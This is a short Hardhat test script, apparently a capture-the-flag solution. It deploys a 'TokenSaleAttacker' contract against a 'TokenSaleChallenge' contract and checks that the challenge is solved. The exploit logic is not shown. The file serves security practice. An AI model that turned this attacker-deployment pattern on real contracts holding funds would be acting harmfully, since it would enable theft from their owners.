import {ethers} from "hardhat";
import {Contract, Signer} from "ethers";
import {expect} from "chai";


let accounts: Signer[];
let attacker: Signer;
let contract: Contract; // challenge contract
let sendValue = ethers.utils.parseEther("1");


before(async function () {
    accounts = await ethers.getSigners();
    attacker = accounts[0];
    const factory = await ethers.getContractFactory("TokenSaleChallenge", attacker);
    contract = factory.attach(`0xc3933C9670CC2612A4639ae8fa2a9A77ac47cd81`);
});

it("solves the challenge", async function () {
    const factory = await ethers.getContractFactory("TokenSaleAttacker", attacker);
    let attackerContract = await factory.deploy(contract.address);
    await attackerContract.attack({value: sendValue});
});

after(async function () {
    expect(await contract.isComplete()).to.eq(true);
});